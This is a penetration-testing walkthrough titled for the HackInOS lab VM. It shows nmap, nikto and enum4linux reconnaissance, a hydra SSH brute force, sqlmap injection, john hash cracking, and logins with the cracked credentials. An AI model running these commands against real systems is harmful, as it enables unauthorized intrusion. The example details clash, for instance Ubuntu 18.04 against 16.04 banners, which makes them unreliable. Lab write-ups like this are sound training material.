
# HackInOS Walkthrough

This guide provides a step-by-step walkthrough of identifying and exploiting vulnerabilities in a target machine using common penetration testing tools.

---

## Prerequisites

- **VirtualBox** or **VMware** installed on your machine.
- **Target machine (VM)** configured and running.
- **Kali Linux** or any penetration testing OS installed.
- Basic knowledge of Linux and penetration testing tools.
- **Metasploit Framework** installed (if using exploitation).

---

## Step 1: Initial Setup

### Network Configuration

- Set the network of both the target machine and the attacker machine to **NAT Network** or **Host-Only** to ensure they are on the same subnet.

### Target Machine Details

- **Name:** TargetVM (Example)  
- **OS:** Ubuntu 18.04  
- **IP Address:** `192.168.48.133` (Example)  
- **Web Page:** [Target Web](http://example.com)

### Example Target IP:
- **Target IP:** `192.168.48.133`

---

## Step 2: Reconnaissance

### Nmap Scan

#### Command:
```bash
nmap 192.168.48.1/24 -sV
```

#### Example Output:
```
Nmap scan report for 192.168.48.133
Host is up (0.0030s latency).
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu) PHP/7.0.32-0ubuntu0.16.04.16)
3306/tcp open  mysql       MySQL 5.7.28
```

### Enum4Linux

#### Command:
```bash
enum4linux -a 192.168.48.133
```

#### Example Output:
```
Known Usernames: admin, root, guest
Workgroup/Domain: WORKGROUP
```

### Nikto Web Scanning

#### Command:
```bash
nikto -h 192.168.48.133
```

#### Example Findings:
- **Outdated Software**: Apache 2.4.18, PHP 7.0.
- **Potential Vulnerabilities**: Directory Traversal on `/uploads/`.

---

## Step 3: Exploitation

### Exploiting SSH Weak Password

#### Command:
```bash
hydra -l admin -P /path/to/rockyou.txt ssh://192.168.48.133
```

#### Example Output:
```
[22][ssh] host: 192.168.48.133  login: admin   password: password123
```

---

### Exploiting Web Application (SQL Injection)

#### Command:
```bash
sqlmap -u "http://192.168.48.133/vulnerable.php?id=1" --dbs
```

#### Example Output:
```
available databases:
[*] information_schema
[*] target_db
```

---

## Step 4: Cracking Password Hashes

### Using John the Ripper

#### Command:
```bash
john --wordlist='/path/to/rockyou.txt' hash.txt
```

#### Example Output:
```
admin:admin123
root:root123
```

---

## Step 5: Accessing Other Services

### FTP Access

#### Command:
```bash
ftp admin@192.168.48.133
```

#### Example Output:
```
Connected to 192.168.48.133.
220 (vsFTPd 3.0.3)
Name (192.168.48.133:admin): admin
Password: password123
```

### MySQL Access

#### Command:
```bash
mysql -u root -p -h 192.168.48.133
```

#### Example Output:
```
Enter password: [root123]
Welcome to the MySQL monitor.
```

---

## Step 6: Cleanup

- Close any open sessions.
- Remove any files created during exploitation.
- Verify no artifacts are left on the target.

---

## Notes

- **Educational Use Only**: Ensure you have proper authorization before testing.
- **Responsible Testing**: Always test in isolated, controlled environments.
